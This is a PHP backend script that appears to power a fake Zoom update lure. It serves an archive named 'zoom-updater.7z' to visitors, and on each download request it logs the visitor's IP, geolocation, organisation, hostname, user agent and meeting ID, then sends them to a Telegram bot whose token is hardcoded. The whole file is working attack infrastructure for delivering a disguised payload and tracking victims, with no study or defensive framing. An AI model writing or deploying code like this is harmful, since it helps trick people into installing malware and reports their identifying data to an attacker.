<?php
// =====================================================
// CONFIGURATION SECTION
// =====================================================
$TELEGRAM_BOT_TOKEN  = "7773179943:AAFCNJvidMHSRCTD2D1IQXg2PiPC9pQXHwzicU";
$TELEGRAM_CHAT_ID    = "217706173556";
// No external download URL needed – file is local.
// =====================================================


// =====================================================
// PROXY MODE — SERVE LOCAL FILE DIRECTLY
// =====================================================
if (isset($_GET['proxy']) && $_GET['proxy'] === '1') {

    // Optional IP filtering (private/reserved blocked)
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
    if (!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
        http_response_code(403);
        exit('Access denied');
    }

    $localFile = __DIR__ . '/zoom-updater.7z';
    if (!file_exists($localFile)) {
        http_response_code(404);
        exit('File not found');
    }

    // Send binary download headers
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="zoom-updater.7z"');
    header('Content-Length: ' . filesize($localFile));
    header('Cache-Control: no-store');
    header('X-Content-Type-Options: nosniff');

    // Stream the file
    readfile($localFile);
    exit;
}


// ==================================================================
// NORMAL MODE (JSON API)
// ==================================================================
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit();
}

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['error' => 'Method not allowed']);
    exit();
}

$input = json_decode(file_get_contents('php://input'), true);


// =====================================================
// REAL IP
// =====================================================
function getRealIP() {
    $headers = ['HTTP_CF_CONNECTING_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_REAL_IP', 'REMOTE_ADDR'];
    foreach ($headers as $header) {
        if (!empty($_SERVER[$header])) {
            $ip = $_SERVER[$header];
            if (strpos($ip, ',') !== false) {
                $ip = trim(explode(',', $ip)[0]);
            }
            if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
                return $ip;
            }
        }
    }
    return $_SERVER['REMOTE_ADDR'] ?? 'unknown';
}


// =====================================================
// CHECK TELEGRAM CONFIG
// =====================================================
if ($TELEGRAM_BOT_TOKEN === "REPLACE_WITH_TELEGRAM_TOKEN" ||
    $TELEGRAM_CHAT_ID === "REPLACE_WITH_CHAT_ID") {

    http_response_code(500);
    echo json_encode(['error' => 'Telegram configuration missing at top of file']);
    exit();
}


// =====================================================
// ACTION HANDLER
// =====================================================
if (($input['action'] ?? '') === 'download') {

    $ip        = getRealIP();
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
    $timestamp = date('Y-m-d H:i:s');
    $meetingId = $input['meetingId'] ?? 'unknown';

    $country = $region = $org = $hostname = '';

    // ===== GEO LOOKUP =====
    $geoUrl = "http://ip-api.com/json/{$ip}?fields=status,country,regionName,org,reverse";

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $geoUrl);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    $geoResponse = curl_exec($ch);
    curl_close($ch);

    if ($geoResponse) {
        $geoData = json_decode($geoResponse, true);
        if ($geoData && ($geoData['status'] ?? '') === 'success') {
            $country  = $geoData['country'] ?? '';
            $region   = $geoData['regionName'] ?? '';
            $org      = $geoData['org'] ?? '';
            $hostname = $geoData['reverse'] ?? '';
        }
    }

    // ===== TELEGRAM MESSAGE (no download URL, just local file) =====
    $msg  = "🌍 New Download Alert!\n\n";
    $msg .= "📌 IP: $ip\n";
    $msg .= "🏳 Country: $country\n";
    $msg .= "📍 Region: $region\n";
    $msg .= "🏢 Org: $org\n";
    $msg .= "🔗 Hostname: $hostname\n";
    $msg .= "🖥 User-Agent: $userAgent\n";
    $msg .= "🕒 Time: $timestamp\n";
    $msg .= "🆔 Meeting ID: $meetingId\n";
    $msg .= "📦 File served: zoom-updater.7z (local)";

    file_get_contents(
        "https://api.telegram.org/bot{$TELEGRAM_BOT_TOKEN}/sendMessage?" .
        http_build_query([
            'chat_id' => $TELEGRAM_CHAT_ID,
            'text' => $msg,
            'disable_web_page_preview' => true
        ])
    );

    // ===== RETURN PROXY DOWNLOAD URL =====
    $proxyUrl =
        (isset($_SERVER['HTTPS']) ? 'https' : 'http') . '://' .
        $_SERVER['HTTP_HOST'] .
        $_SERVER['PHP_SELF'] .
        '?proxy=1';

    echo json_encode([
        'success' => true,
        'downloadUrl' => $proxyUrl
    ]);
    exit();
}

echo json_encode(['error' => 'Unknown action']);
exit();